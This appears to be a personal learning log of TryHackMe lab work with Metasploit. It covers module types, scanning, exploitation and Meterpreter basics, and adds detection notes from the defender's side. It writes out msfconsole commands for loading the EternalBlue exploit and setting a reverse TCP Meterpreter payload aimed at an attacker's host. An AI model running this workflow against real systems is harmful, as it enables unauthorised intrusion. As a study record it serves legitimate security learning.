Metasploit Framework – Practical Learning Log

Platform: TryHackMe (Free Rooms + Local Test Machines)
Category: Exploitation Framework / Offensive Security
Tool: Metasploit Framework (msfconsole)
Status: Completed (Core Concepts + Hands-On) ✅
---
📌 Overview

This repository documents my hands-on learning journey with the Metasploit Framework, focusing on understanding its internal architecture, module usage, exploitation workflow, and post-exploitation basics.
The learning was performed using TryHackMe free content and deliberately vulnerable test machines in a controlled lab environment.
---
🎯 Learning Objectives

Understand Metasploit architecture and module types
Gain confidence using msfconsole
Perform scanning, exploitation, and basic post-exploitation
Work with reverse TCP payloads
Learn common mistakes, limitations, and detection points
---
🧱 Core Concepts Covered
1️⃣ Metasploit Architecture

Modules: Reusable components written mostly in Ruby
Exploit: Code that targets a specific vulnerability
Payload: Code executed after exploitation

Encoder: Obfuscates payloads (not encryption)
NOPs: Padding for exploit reliability
Auxiliary: Scanners, fuzzers, brute-force tools
--
2️⃣ Module Types (Hands-On)

exploit/*
payload/*
auxiliary/scanner/*
post/*
encoder/*
Example:

use exploit/windows/smb/ms17_010_eternalblue
---
🧪 Practical Workflow (Hands-On)
🔍 Recon & Scanning

Used auxiliary scanners for:
Open ports
Service enumeration
SMB checks

use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
run
--
💥 Exploitation

Selected exploit based on service/version
Configured payload manually
Used reverse TCP shells

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run


Key focus:

Matching exploit ↔ payload compatibility
Correct network configuration (NAT / Host-Only)
Listener behavior
---
🧠 Meterpreter (Intro Level)

Basic post-exploitation commands practiced:

sysinfo
getuid
pwd
ls
shell


Concepts learned:

In-memory execution
Reduced disk artifacts
Why Meterpreter is stealthier than raw shells
---
🕵️ Attacker Point of View

Metasploit drastically reduces exploit development time
Misconfiguration is often more exploitable than zero-days
Reverse shells are more reliable behind NAT/firewalls
Payload choice affects detection and stability
---
🛡️ Defender Point of View

Key detection & mitigation insights:
Metasploit traffic patterns are well-known
Reverse TCP payloads often trigger EDR alerts
Default Metasploit payloads are highly signature-based
--
Monitoring:
Unusual outbound connections
Suspicious parent-child processes
In-memory execution anomalies
---
⚠️ Limitations & Lessons Learned

Metasploit ≠ magic button
Exploits often fail due to:
Wrong target version
Bad payload choice
Network misconfiguration
Real-world exploitation requires:
Manual validation
Custom payloads
Evasion techniques beyond defaults
---
🧩 Tools & Commands Used

msfconsole
search, use, set, show options
exploit / run
sessions
meterpreter
---
📚 Key Takeaways

Metasploit is a framework, not just an exploit launcher
Understanding modules is more important than memorizing commands
Hands-on labs are essential to avoid false assumptions
Knowing how defenders detect Metasploit improves attacker realism
